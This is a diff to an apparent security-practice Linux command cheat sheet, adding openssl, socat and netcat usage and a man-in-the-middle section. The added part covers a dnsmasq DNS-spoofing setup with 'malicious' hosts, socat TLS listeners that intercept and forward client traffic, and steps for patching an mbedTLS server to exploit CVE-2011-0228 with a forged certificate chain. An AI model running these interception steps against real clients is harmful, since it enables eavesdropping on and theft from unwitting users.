@@ -176,7 +176,8 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
 - **openssl**:
    - `openssl [command] -help`
    - `openssl list -help`
-   - `openssl s_client -connect host:port`
+   - `openssl s_client -connect host:port`: establish TLS connection to host:port
+   - `openssl x509 -in hacking.crt -text`: Inspect content of certificate
    - `openssl enc -aes256 -k secret101 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc`: create encrypted backup non-interactively with -key "secret101"
    - `openssl enc -aes256 -k secret101 -d -in file.txt.enc -out file.txt`: decrypt non-interactively with supplied key "secret101"
    - **Generate Fingeprint from x509.pem**:
@@ -187,6 +188,8 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
    - `openssl genrsa -out private.key 1024`: Generate private key
    - `openssl req -new -x509 -key private.key -out publickey.cer -days 365`: Generate certificate 
    - `openssl pkcs12 -export -out public_privatekey.pfx -inkey private.key -in publickey.cer`: Export your x509 certificate and private key to pfx file
+   - **Generate CSR (Certificate Signing Request)**:
+   - `openssl req -new -sha256 -key private.key -out example.com.csr`
 - **scp** (OpenSSH secure file copy):
    - Syntax: `scp option source destination`
    - `scp -v -P 2222 admin@192.168.0.23:/storage/Download/file.pdf /tmp`: copy from remote server to /tmp verbose, port 2222
@@ -276,9 +279,6 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
    - **Use curl for OpenSourceVulnerability DB (OSV)**:
    - `curl -X POST -d '{"version": "2.4.1", "package": {"name": "jinja2", "ecosystem": "PyPI"}}' "https://api.osv.dev/v1/query"`: Linux
    - `curl -X POST -d "{\"package\": {\"name\": \"mruby\"}, \"version\": \"2.1.2rc\"}" "https://api.osv.dev/v1/query"`: Windows (avoid single quotes)
-- **netcat/nc**
-   - Syntax: `nc host port`
-   - `echo -ne "HEAD / HTTP/1.1\r\nHost: 192.168.0.10\r\nConnection: close\r\n\r\n" | netcat 192.168.0.10 80`: send HTTP Head request via netcat
 - **wkhtmltopdf**
    - [https://wkhtmltopdf.org/](https://wkhtmltopdf.org/)
    - `sudo apt install wkhtmltopdf`
@@ -314,7 +314,7 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
      - `-d [layer type]==[selector]`
      - `-r [file]`: read from file.pcap
      - `-w [file]`: write result to file
-- **ncat/nc**
+- **netcat/nc**
    - [https://nmap.org/ncat/guide/index.html](https://nmap.org/ncat/guide/index.html)
    - `nc [options] [host] [port]`: Execute a port scan
    - `nc -l [host] [port]`: Initiate a listener on the given port
@@ -324,6 +324,7 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
    - `nc -k -l`: Continue listening after disconnection
    - `nc -n`: Skip DNS lookups / numerical
    - `nc -v`: verbose output 
+   - `echo -ne "HEAD / HTTP/1.1\r\nHost: 192.168.0.10\r\nConnection: close\r\n\r\n" | netcat 192.168.0.10 80`: send HTTP Head request via netcat
    - **Create Channel**
      - Kali: `nc -lvnp [Port]` (Check your listening status in another terminal by using command `netstat`)
      - Windows: `nc [IPv4] [Port]` ; `get`
@@ -342,16 +343,55 @@ To note: `/etc/profile` is executed for **interactive shells** while `/etc/bashr
      - `nc [host] [port]`
      - `GET / HTTP/1.0`
      - Press 2x Enter
+- **socat**: 
+   - *Like netcat but with security*
+   - `socat TCP-LISTEN:80,fork TCP:202.54.1.5:80`: To redirect all port 80 connections to ip 202.54.1.5
+   - `socat - TCP4:www.example.com:80`: Connect to example.com and transfer data between STDIO (-) and TCP4:80
+   - `socat TCP4-LISTEN:81,fork,reuseaddr TCP4:TCP4:192.168.1.10:80`: listen on port 81, accept multiple connections 8**fork**) and forward to remote_host:80
 - **dnsmasq**
    - **Setup MITM DNS Service** 
      - `nano dnsmasq.conf` -> add `addn-hosts=dnsmasq.hosts`: create configuration file
      - `nano dnsmasq.hosts` -> add `IPv4  mitm.example.com`: add (malicious) hosts
      - `sudo dnsmasq -C dnsmasq.conf --no-daemon`: start dnsmasq in foreground with specified configuration
-       - You may face probelms if systemd-resolve occupies port 53 --> [Look here](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Linux.md#systemd-resolved-vs-dnsmasq)
+       - You may face problems if **systemd-resolve occupies port 53** --> [Look here](https://github.com/p-arrow/Red-Blue-Guide/blob/main/OperatingSystem/Linux.md#systemd-resolved-vs-dnsmasq)
      - `dig mitm.example.com` and `dig @localhost mitm.example.com`: Verify if dnsmasq works as expected
      - Get your victim to send its DNS query to your server, where dnsmasq is running
    - **Setup MITM TCP Server**
      - `sudo nc -lvnp 80`
+   - **Setup MITM TCP Server with TLS**
+     - **Requirement(s)**: 
+       - The client does not check if hostname (target destination) and certificate's subject (CN) match
+       - The client does not check certificate's validity
+       - The client does not check if certificate is signed by a valid certificate authority (CA)
+       - The client does not check if parent certificate is a certificate authority
+       - *Normally these checks are performed for all certificates in the certificate chain to establish a chain of trust*
+     - 1) Generate openssl key pair and x509 certificate yourself
+     - `sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -`: self-signed
+     - 2) Use a valid certificate trusted by the client
+     - `sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=myCert.crt,key=private.key,cafile=CA.pem,verify=0 -`: 
+       - The `-` at the end will provide the content of the request in our terminal
+       - `verify=0`: disable X.509 Certificate Verification of client
+       - If you want to simply listen and forward the request to a local/remote host:
+       - `sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0` 
+- **mbedTLS**
+   - [https://tls.mbed.org](https://tls.mbed.org): SSL library
+   - Allows to create malicious server with invalid certificate chain
+   - Usable to exploit **CVE-2011-0228**, where client does NOT ensure that the parent certificate is a certificate authority
+   - This means a malicious.crt is granted even thoudh it's `valid.parent.crt` is not a CA
+     - This can be verified: `openssl x509 -in valid.parent.crt -text`
+     - Expected output: `X509v3 Basic Constraints: critical` + `CA:FALSE` 
+   - `wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz`
+   - `tar -zxf mbedtls-2.2.1-apache.tgz`
+   - `cd mbedtls-2.2.1`
+   - `apt-get update && apt-get upgrade`
+   - `apt-get install build-essential`
+   - `make`
+   - Modify `programs/ssl/ssl_server.c` by using your `myca.pem` and `private.key` from file system + switch listening port to 443
+   - Create myca.pem: `cat malicious.crt valid.parent.crt valid.grandparent.crt > /your/path/myca.pem`
+   - `ret =  mbedtls_x509_crt_parse_file(&srvcert, "/root/myca.pem");`: Around line 134
+   - `ret =  mbedtls_pk_parse_keyfile(&pkey, "/root/mitm.private.key",NULL);`: Around line 150
+   - `make`: compile the modified file
+   - `./programs/ssl/ssl_server`: if you changed port to 443 you need to run this command as **sudo user**
 
 <br />
 
